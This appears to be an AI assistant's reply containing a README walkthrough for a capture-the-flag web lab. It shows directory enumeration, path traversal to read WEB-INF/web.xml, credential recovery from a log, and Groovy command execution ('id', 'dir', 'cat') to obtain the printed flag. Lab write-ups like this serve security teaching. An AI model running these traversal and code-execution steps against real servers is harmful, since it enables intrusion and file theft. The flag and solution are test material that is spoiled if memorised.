Here’s the updated `README.md` with the modified step:

````markdown
# Path to RCE Walkthrough

## Objective

The goal of this lab is to discover a Remote Code Execution (RCE) vulnerability and retrieve the flag located in the `/flag.txt` file on the server's filesystem root.

---

## Lab Details

- **Difficulty**: Easy
- **Release Date**: January 17th, 2025
- **URL**: [https://5mnpbn0f.eu1.ctfio.com/admin/incident-report](https://5mnpbn0f.eu1.ctfio.com/admin/incident-report)

---

## Walkthrough

### Step 1: Directory Enumeration

Using `dirsearch`, enumerate directories to identify hidden paths.

```bash
dirsearch -u https://5mnpbn0f.eu1.ctfio.com
```
````

**Result**: The `/admin` directory is discovered.  
![image.png](image.png)

---

### Step 2: Exploring the `/admin` Directory

Inspecting the `/admin` path reveals the `/admin/download` endpoint.  
![image.png](image%201.png)

---

### Step 3: File Traversal Attack

Attempt to retrieve sensitive files using path traversal techniques:

1. Tested `/admin/download?filename=/WEB-INF/web.xml.jsf`, but it didn’t work.
2. Successfully accessed `/admin/download?filename=/WEB-INF/web.xml`.

![image.png](image%202.png)

---

### Step 4: Accessing `/admin/incident-report`

Next, navigate to the following URL:  
[https://5mnpbn0f.eu1.ctfio.com/admin/incident-report](https://5mnpbn0f.eu1.ctfio.com/admin/incident-report)

**Result**: The log file is automatically downloaded upon visiting this URL.  
![image.png](image%203.png)

---

### Step 5: Decoding the Password Hash

Extract the encoded hash from the log file and decode it to retrieve the password.  
![image.png](image%204.png)

---

### Step 6: Logging In

Use the decoded password to log into the admin panel.  
![image.png](image%205.png)

---

### Step 7: Executing Commands

After logging in, explore file execution by running commands.

1. Execute `print "id".execute().text` to retrieve the user ID.  
   ![image.png](image%206.png)

2. Execute `print "dir".execute().text` to list directory contents.  
   ![image.png](image%207.png)

---

### Step 8: Searching for the Flag

Inspect the directory contents for a flag file.

1. After executing `print "dir".execute().text`, locate the `flag.txt` file.  
   ![image.png](image%208.png)

2. To read the flag, execute the command:
   ```groovy
   print "cat abcdflag.txt".execute().text
   ```

**Result**: The flag is revealed.  
![image.png](image%209.png)  
![image.png](image%2010.png)

---

## Flag

```text
flag{530deb6454d57b13c2089064d4f48f66}
```

---

## Tools and Techniques Used

- **dirsearch**: Directory brute-forcing
- **Path Traversal**: Exploiting file retrieval vulnerabilities
- **Hash Decoding**: Extracting credentials from logs
- **Command Execution**: Leveraging RCE to enumerate and retrieve sensitive files

---

## Lessons Learned

- Hidden directories and paths can provide critical access points.
- Logs often contain sensitive information, such as credentials.
- Proper server-side validation is crucial to avoid RCE vulnerabilities.

---

Feel free to use this walkthrough as a guide to solve the lab. 🎉

```

Let me know if you need further adjustments!
```
